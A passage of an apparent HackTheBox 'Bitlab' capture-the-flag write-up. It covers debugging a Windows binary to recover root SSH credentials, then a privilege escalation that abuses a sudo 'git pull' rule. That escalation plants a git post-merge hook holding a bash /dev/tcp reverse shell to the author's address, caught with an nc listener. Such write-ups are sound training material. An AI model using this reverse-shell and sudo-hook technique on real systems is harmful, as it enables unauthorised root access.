+<p>EXCEPTION_ACCESS_VIOLATION</p>
+<p>Ntdll - Inaccesible Address</p>
+</blockquote>
+<p>So if anyone have any idea where this come from and how to fix please leave a comment.</p>
+<p>Anyway, I managed to borrow a Windows computer just to finish this box.</p>
+<p>The executable is 32-bit, running it display the following:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\hg8\&gt; .\RemoteConnection.exe</span><br><span class="line">Access Denied !!</span><br></pre></td></tr></table></figure>
+
+<h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><p>Running <code>strings</code> on the file doesn’t output a lot of valuable informations: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ strings RemoteConnection.exe</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class="line">XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS</span><br><span class="line">parse</span><br><span class="line">Access Denied !!</span><br><span class="line">string too long</span><br><span class="line">invalid string position</span><br><span class="line">GetUserNameW</span><br><span class="line">ShellExecuteW</span><br><span class="line">SHELL32.dll</span><br></pre></td></tr></table></figure>
+
+<p>We can see <code>GetUserNameW</code> what <em>might</em> be used to retrieve the current Windows session username and <code>ShellExecuteW</code> which is a function to run external command.</p>
+<p>To get more information out of it I will use a debugger. This way maybe we can pull more valuable informations during runtime by reading the memory or even patching the binary to bypass the check leading to <code>Access Denied</code>.</p>
+<h4 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h4><p>I will use <a href="https://x64dbg.com" target="_blank" rel="noopener"><code>x32dbg</code></a> since it’s free and open-source. </p>
+<p>After opening our binary we forward run once to arrive to the <code>RemoteConnection.exe</code> entry point:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80528522-5907bb00-8996-11ea-9857-427940c42f1a.png" alt="remoteconnection.exe entry point"></p>
+<p>Now let’s extract the referenced strings using the function provided by x32dbg:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80528813-d0d5e580-8996-11ea-80e5-8f100149aaec.png" alt="remoteconnexion.exe bitlab strings"></p>
+<p>This is starting to get a bit more interesting. We have a reference to our previous user <code>clave</code> and a reference to <code>putty.exe</code>. Putty is a Windows terminal emulator often used to connect to server through SSH.</p>
+<p>If I could guess so far, the program check using <code>GetUserNameW</code> if the current user is <code>clave</code> and if so it will launch <code>putty.exe</code> using <code>ShellExecuteW</code> to automatically connect to, probably, the root account on Bitlab server. Unfortunately there is still no passwords in those referenced strings.</p>
+<p>Let’s continue digging to see if we can either:</p>
+<ul>
+<li>Reverse the algorithm used to obfuscate the password.</li>
+<li>Patch the binary to launch putty even if the connected user is not <code>clave</code>.</li>
+<li>Read some other interesting strings from memory.</li>
+</ul>
+<p>To start off let’s double-click the <code>L&quot;clave&quot;</code> to see where it’s reference:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80529378-ae909780-8997-11ea-9b67-1d56644cfa18.png" alt="clave cmp bitlab"></p>
+<p>Ok so looks like we are on the right track, we have a compare to the <code>clave</code> strings if the comparaison fail we jump to what is probably the <code>Access Denied !!</code> error message, while if the comparaison return true the function continue to the call of <code>putty.exe</code>.</p>
+<h4 id="Breaking"><a href="#Breaking" class="headerlink" title="Breaking"></a>Breaking</h4><p>Let’s put a breakpoint on the <code>clave</code> <code>cmp</code> line to see what’s going on it memory. To do so click the grey circle on the left of the line to turn it red. Then let’s forward once:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80529782-42fafa00-8998-11ea-8bcc-5e13388f7ae5.png" alt="bitlab remoteconnexion.exe strings password"></p>
+<p>Bingo! Even at the moment of comparing the user the <code>eax</code> already contains the full command passed to Putty.</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80529850-69b93080-8998-11ea-888c-cdb5253103bd.png" alt="bitlab root credentials remoteconnexion.exe"></p>
+<p>Let’s use the those credentials to login to the root account using SSH:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ssh root@bitlab.htb</span><br><span class="line">root@bitlab.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Last login: Fri Sep 13 14:11:14 2019</span></span><br><span class="line"><span class="string">root@bitlab:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@bitlab:~# cat root.txt</span></span><br><span class="line"><span class="string">8xxxxxxxxxxxxxxxxxxxxxxxxc</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="“Unintended”-way-to-root"><a href="#“Unintended”-way-to-root" class="headerlink" title="“Unintended” way to root"></a>“Unintended” way to root</h2><p>While having a shell as <code>www-data</code> we notice an unusual <code>sudo</code> configuration:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bitlab:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bitlab:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git pull</span><br></pre></td></tr></table></figure>
+
+<p>This is used to automatically deploy projects to the server. The sudo is probably used to pull file where even if the permissions does not match.</p>
+<p>The Git documentation point an interesting fact about <code>git pull</code>:</p>
+<blockquote>
+<p>In its default mode, <code>git pull</code> is shorthand for <code>git fetch</code> followed by <code>git merge FETCH_HEAD</code>.</p>
+<p><a href="https://git-scm.com/docs/git-pull" target="_blank" rel="noopener">https://git-scm.com/docs/git-pull</a></p>
+</blockquote>
+<p>That mean we have a <code>git merge</code> run as root. We can probably leverage this with a hook to achieve remote code execution as <code>root</code>. As a reminder:</p>
+<blockquote>
+<p>Hooks are programs you can place in a hooks directory to trigger actions at certain points in git’s execution. </p>
+<p><a href="https://git-scm.com/docs/githooks" target="_blank" rel="noopener">https://git-scm.com/docs/githooks</a></p>
+</blockquote>
+<p>We are going to use a <a href="https://git-scm.com/docs/githooks#_post_merge" target="_blank" rel="noopener"><code>post-merge</code></a> hook since it’s going to be executed whenever a <code>git pull</code> is executed.</p>
+<p>Unfortunately neither <code>profile</code> nor <code>deployer</code> project can be directly written as <code>www-data</code>. That’s not really a problem since we can simply copy the project to the <code>/tmp/</code> folder for example and be able to work on it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ cp -r /var/www/html/profile /tmp/.hg8</span><br><span class="line">www-data@bitlab:/$ <span class="built_in">cd</span> /tmp/.hg8/profile/.git/hooks</span><br><span class="line">www-data@bitlab:/$ touch post-merge</span><br><span class="line">www-data@bitlab:/$ chmod +x post-merge</span><br></pre></td></tr></table></figure>
+
+<p>Let’s try to open a reverse shell as <code>root</code> using that hook. First let’s create our reverse shell file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ cat post-merge</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>Then we open our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Next step is to make a <code>sudo /usr/bin/git pull</code> to have our hook and reverse shell executed:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull</span><br><span class="line">Already up to date.</span><br></pre></td></tr></table></figure>
+
+<p>Ah yes, there is no change to the project, let’s quickly go back to the Gitlab interface and commit a dummy file to <code>profile</code> project, then let’s <code>git pull</code> again:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull   </span><br><span class="line">remote: Enumerating objects: 1, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 1 (delta 1), reused 1 (delta 1)</span><br><span class="line">Unpacking objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">From ssh://localhost:3022/root/profile</span><br><span class="line">   34c4513..86773b8  master     -&gt; origin/master</span><br><span class="line">Updating 34c4513..86773b8</span><br><span class="line">Fast-forward</span><br><span class="line"> hg8 | 1 +</span><br><span class="line"> 1 file changed, 1 addition(+)</span><br></pre></td></tr></table></figure>
+
+<p>And we get a new connection on our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.114:40048</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">$ cat root.txt</span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>As always do not hesitate to contact me for any questions or feedback.</p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/linux/">linux</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/bitlab/" rel="tag">bitlab</a>, <a class="tag-link" href="/tags/git/" rel="tag">git</a>, <a class="tag-link" href="/tags/git-hook/" rel="tag">git hook</a>, <a class="tag-link" href="/tags/gitlab/" rel="tag">gitlab</a>, <a class="tag-link" href="/tags/obfuscation/" rel="tag">obfuscation</a>, <a class="tag-link" href="/tags/webshell/" rel="tag">webshell</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag.</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-shell-as-www-data"><span class="toc-number">1.2.</span> <span class="toc-text">Web-shell as www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-clave-user"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot www-data -&gt; clave user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-engineering-of-RemoteConnection-exe"><span class="toc-number">2.2.</span> <span class="toc-text">Reverse engineering of RemoteConnection.exe</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Strings"><span class="toc-number">2.2.1.</span> <span class="toc-text">Strings</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Debugging"><span class="toc-number">2.2.2.</span> <span class="toc-text">Debugging</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Breaking"><span class="toc-number">2.2.3.</span> <span class="toc-text">Breaking</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#“Unintended”-way-to-root"><span class="toc-number">3.</span> <span class="toc-text">“Unintended” way to root</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/bitlab/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/bitlab/&text=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/bitlab/&is_video=false&description=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Bitlab&body=Check out this article: https://hg8.sh/bitlab/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/bitlab/&title=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/bitlab/&name=HackTheBox - Bitlab&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/bitlab/&t=HackTheBox - Bitlab" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
